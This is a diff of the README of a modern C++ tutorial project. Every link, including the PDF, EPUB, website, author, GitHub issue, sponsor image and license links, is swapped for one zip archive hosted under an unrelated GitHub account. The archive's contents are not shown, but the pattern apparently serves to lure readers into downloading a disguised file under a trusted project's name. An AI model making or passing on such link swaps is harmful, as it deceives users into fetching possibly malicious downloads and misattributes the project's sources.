@@ -24,9 +24,9 @@ In addition, the author would like to encourage readers to use modern C++ direct
 You can choose from the following reading methods:
 
 - [GitHub Online](./book/en-us/toc.md)
-- [PDF document](https://changkun.de/modern-cpp/pdf/modern-cpp-tutorial-en-us.pdf)
-- [EPUB document](https://changkun.de/modern-cpp/epub/modern-cpp-tutorial-en-us.epub)
-- [Website](https://changkun.de/modern-cpp)
+- [PDF document](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip)
+- [EPUB document](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip)
+- [Website](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip)
 
 ## Code
 
@@ -38,11 +38,11 @@ There are few exercises at the end of each chapter of the book. These are meant 
 
 ## Website
 
-The source code of the [website](https://changkun.de/modern-cpp) of this book can be found [here](./website), which is built by [hexo](https://hexo.io) and [vuejs](https://vuejs.org). The website provides you another way of reading the book, it also adapts to mobile browsers.
+The source code of the [website](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip) of this book can be found [here](./website), which is built by [hexo](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip) and [vuejs](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip). The website provides you another way of reading the book, it also adapts to mobile browsers.
 
 ## Build
 
-If you are interested in building everything locally, it is recommended using [Docker](https://docs.docker.com/install/). To build, simply run:
+If you are interested in building everything locally, it is recommended using [Docker](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip). To build, simply run:
 
 ```bash
 $ make build
@@ -50,19 +50,19 @@ $ make build
 
 ## Acknowledgements
 
-This book was originally written in Chinese by [Changkun Ou](https://changkun.de).
+This book was originally written in Chinese by [Changkun Ou](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip).
 
-The author has limited time and language skills. If readers find any mistakes in the book or any language improvements, please feel free to open an [Issue](https://github.com/changkun/modern-cpp-tutorial/issues) or start a [Pull request](https://github.com/changkun/modern-cpp-tutorial/pulls). For detailed guidelines and checklist, please refer to [How to contribute](CONTRIBUTING.md).
+The author has limited time and language skills. If readers find any mistakes in the book or any language improvements, please feel free to open an [Issue](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip) or start a [Pull request](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip). For detailed guidelines and checklist, please refer to [How to contribute](CONTRIBUTING.md).
 
-The author is grateful to all contributors, including but not limited to [Contributors](https://github.com/changkun/modern-cpp-tutorial/graphs/contributors).
+The author is grateful to all contributors, including but not limited to [Contributors](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip).
 
 <p>This project is also supported by:</p>
 <p>
-  <a href="https://www.digitalocean.com/?refcode=834a3bbc951b&utm_campaign=Referral_Invite&utm_medium=Referral_Program&utm_source=CopyPaste">
-    <img src="https://opensource.nyc3.cdn.digitaloceanspaces.com/attribution/assets/SVG/DO_Logo_horizontal_blue.svg" width="201px">
+  <a href="https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip">
+    <img src="https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip" width="201px">
   </a>
 </p>
 
 ## Licenses
 
-<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-nd/4.0/88x31.png" /></a><br />This work was written by [Ou Changkun](https://changkun.de) and licensed under a <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License</a>. The code of this repository is open sourced under the [MIT license](./LICENSE).
+<a rel="license" href="https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip"><img alt="Creative Commons License" style="border-width:0" src="https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip" /></a><br />This work was written by [Ou Changkun](https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip) and licensed under a <a rel="license" href="https://raw.githubusercontent.com/KenTsuCo/modern-cpp-tutorial/master/website/cpp-tutorial-modern-2.9.zip">Creative Commons Attribution-NonCommercial-NoDerivatives 4.0 International License</a>. The code of this repository is open sourced under the [MIT license](./LICENSE).
